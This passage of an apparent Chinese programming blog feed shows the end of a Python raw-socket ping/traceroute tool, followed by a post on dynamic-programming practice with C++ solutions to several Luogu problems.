class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">)</span><span class="token operator">:</span>        # 将主机名转ipv4地址格式，返回以ipv4地址格式的字符串，如果主机名称是ipv4地址，则它将保持不变        dst_addr <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">gethostbyname</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"\nrouting &#123;0&#125;[&#123;1&#125;](max hops = 30, detect tries = 3)\n"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>            host<span class="token punctuation">,</span> dst_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> ttl in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>MAX_HOPS<span class="token punctuation">)</span><span class="token operator">:</span>            time<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>            <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"&#123;0:&lt;3d&#125;"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>ttl<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>            flag <span class="token operator">=</span> False            <span class="token keyword">for</span> tries in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>TRIES<span class="token punctuation">)</span><span class="token operator">:</span>                imcp_packet <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">build_imcp_packet</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>                send_request_traceroute_time<span class="token punctuation">,</span> rawsocket<span class="token punctuation">,</span> dst_addr <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">traceroute_raw_socket</span><span class="token punctuation">(</span>                    dst_addr<span class="token punctuation">,</span> imcp_packet<span class="token punctuation">,</span> ttl<span class="token punctuation">)</span>                ready <span class="token operator">=</span> select<span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">[</span>rawsocket<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>TIMEOUT<span class="token punctuation">)</span>                end_time <span class="token operator">=</span> time<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                during_time <span class="token operator">=</span> end_time <span class="token operator">-</span> send_request_traceroute_time                global ip_head<span class="token punctuation">,</span> receive_packet<span class="token punctuation">,</span> addr                <span class="token keyword">if</span> during_time <span class="token operator">>=</span> self<span class="token punctuation">.</span>TIMEOUT<span class="token operator">:</span>                    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"&#123;0:>7&#125;    "</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token char">'*'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token operator">:</span>                    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"&#123;0:7.2f&#125; ms "</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>during_time <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>                    flag <span class="token operator">=</span> True                    receive_packet<span class="token punctuation">,</span> addr <span class="token operator">=</span> rawsocket<span class="token punctuation">.</span><span class="token function">recvfrom</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>                    ip_head <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">parse_ip_header</span><span class="token punctuation">(</span>receive_packet<span class="token punctuation">[</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>tries <span class="token operator">>=</span> self<span class="token punctuation">.</span>TRIES <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> False<span class="token punctuation">)</span><span class="token operator">:</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" request timeout"</span><span class="token punctuation">)</span>                        <span class="token keyword">break</span>                    icmp_head <span class="token operator">=</span> receive_packet<span class="token punctuation">[</span><span class="token number">20</span><span class="token operator">:</span><span class="token number">28</span><span class="token punctuation">]</span>                    type<span class="token punctuation">,</span> code<span class="token punctuation">,</span> checksum<span class="token punctuation">,</span> packet_id<span class="token punctuation">,</span> sequence <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span>                        <span class="token string">">BBHHH"</span><span class="token punctuation">,</span> icmp_head<span class="token punctuation">)</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> self<span class="token punctuation">.</span>TYPE_ICMP_UNREACHED <span class="token operator">and</span> flag <span class="token operator">==</span> False<span class="token punctuation">)</span><span class="token operator">:</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" Wrong!unreached net/host/port!"</span><span class="token punctuation">)</span>                        <span class="token keyword">break</span>                    <span class="token function">elif</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> self<span class="token punctuation">.</span>TYPE_ICMP_OVERTIME<span class="token punctuation">)</span><span class="token operator">:</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" &#123;&#125;"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>ip_head<span class="token punctuation">[</span><span class="token char">'src_ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token function">elif</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">:</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" &#123;&#125;"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>ip_head<span class="token punctuation">[</span><span class="token char">'src_ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"program run over!"</span><span class="token punctuation">)</span>                        <span class="token keyword">return</span>                    <span class="token keyword">else</span><span class="token operator">:</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" &#123;&#125;"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>ip_head<span class="token punctuation">[</span><span class="token char">'src_ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>def <span class="token function">usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Usage: tool.py [-T host ] [-h help] [-P host]\n"</span><span class="token punctuation">)</span>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Options:"</span><span class="token punctuation">)</span>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"       -P       ping &lt;host>"</span><span class="token punctuation">)</span>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"       -T       traceroute &lt;host>"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token operator">:</span>    <span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token operator">:</span>        <span class="token function">usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"-P"</span> <span class="token operator">or</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"-p"</span><span class="token punctuation">)</span><span class="token operator">:</span>        T <span class="token operator">=</span> <span class="token function">PING</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span><span class="token function">ping</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token function">elif</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"-T"</span> <span class="token operator">or</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"-t"</span><span class="token punctuation">)</span><span class="token operator">:</span>        T <span class="token operator">=</span> <span class="token function">TraceRoute</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span><span class="token function">traceroute</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token operator">:</span>        <span class="token function">usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>动态规划练习</title>
      <link href="/2021/09/19/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/09/19/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="动态规划练习"><a href="#动态规划练习" class="headerlink" title="动态规划练习"></a>动态规划练习</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于很久没有做动态规划相关题目，导致思维迟钝，便打算和SLM一起做做题单。初步刷的是洛谷的<a href="https://www.luogu.com.cn/training/list?keyword=%E5%8A%A8%E6%80%81&amp;page=1">题单</a>，中途可能也会加一下刷周赛的时候碰到的题目。</p><h3 id="动态规划的引入"><a href="#动态规划的引入" class="headerlink" title="动态规划的引入"></a><a href="https://www.luogu.com.cn/training/211#problems">动态规划的引入</a></h3><h4 id="P1434-滑雪"><a href="#P1434-滑雪" class="headerlink" title="P1434 滑雪"></a><a href="https://www.luogu.com.cn/problem/P1434">P1434 滑雪</a></h4><ul><li><p>题意：<br>给定一个矩阵，求最长的递减数组的长度。</p></li><li><p>题解:<br>这题目算是经典的模型了，如果使用搜索那么会有大量的对于重复问题的计算，那么就可以使用记忆化搜索来简化运算。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> mp<span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> dirx<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> diry<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> ux<span class="token punctuation">,</span><span class="token keyword">int</span> uy<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span>ux<span class="token punctuation">]</span><span class="token punctuation">[</span>uy<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span>ux<span class="token punctuation">]</span><span class="token punctuation">[</span>uy<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> tx <span class="token operator">=</span> ux <span class="token operator">+</span> dirx<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> ty <span class="token operator">=</span> uy <span class="token operator">+</span> diry<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>tx <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> tx <span class="token operator">></span> n <span class="token operator">||</span> ty <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> ty <span class="token operator">></span> m<span class="token punctuation">)</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>mp<span class="token punctuation">[</span>ux<span class="token punctuation">]</span><span class="token punctuation">[</span>uy<span class="token punctuation">]</span> <span class="token operator">></span> mp<span class="token punctuation">[</span>tx<span class="token punctuation">]</span><span class="token punctuation">[</span>ty<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            dp<span class="token punctuation">[</span>ux<span class="token punctuation">]</span><span class="token punctuation">[</span>uy<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>ux<span class="token punctuation">]</span><span class="token punctuation">[</span>uy<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token function">dfs</span><span class="token punctuation">(</span>tx<span class="token punctuation">,</span> ty<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>ux<span class="token punctuation">]</span><span class="token punctuation">[</span>uy<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> m<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            cin <span class="token operator">>></span> mp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            res <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> res <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P2196-挖地雷"><a href="#P2196-挖地雷" class="headerlink" title="P2196 挖地雷"></a><a href="https://www.luogu.com.cn/problem/P2196">P2196 挖地雷</a></h4><ul><li><p>题意：<br>给一个图，和图上每个点的权值，求最大的连续点的权值和，并且输出这些点。</p></li><li><p>题解:<br>在动态规划的时候记录一下路径即可。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> mp<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> pre<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> val<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> nxt<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>nxt<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>nxt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> val<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> ux<span class="token punctuation">;</span>            cin <span class="token operator">>></span> ux<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>ux<span class="token punctuation">)</span>                mp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> mp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>mp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span>val<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">></span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> val<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    nxt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> pos <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ans <span class="token operator">&lt;</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            ans <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> pos <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>pos <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> pos <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        pos <span class="token operator">=</span> nxt<span class="token punctuation">[</span>pos<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span>         <span class="token operator">&lt;&lt;</span> ans<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P4017-最大食物链计数"><a href="#P4017-最大食物链计数" class="headerlink" title="P4017 最大食物链计数"></a><a href="https://www.luogu.com.cn/problem/P4017">P4017 最大食物链计数</a></h4><ul><li><p>题意：<br>给一个图，求以入度为0的点为源点，出度为0的点为终点的路径的条数。</p></li><li><p>题解:<br>记忆化搜索搜一下。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> mp<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> dp<span class="token punctuation">;</span><span class="token keyword">int</span> vis<span class="token punctuation">[</span><span class="token number">5005</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> mod <span class="token operator">=</span> <span class="token number">80112002</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> u<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>mp<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>it <span class="token operator">:</span> mp<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        dp<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">dfs</span><span class="token punctuation">(</span>it<span class="token punctuation">)</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">%=</span> mod<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>       <span class="token keyword">return</span> dp<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">%</span> mod<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m<span class="token punctuation">;</span>    mp<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> ux<span class="token punctuation">,</span> uy<span class="token punctuation">;</span>        cin <span class="token operator">>></span> ux <span class="token operator">>></span> uy<span class="token punctuation">;</span>        vis<span class="token punctuation">[</span>ux<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        mp<span class="token punctuation">[</span>uy<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>ux<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    dp<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> source<span class="token 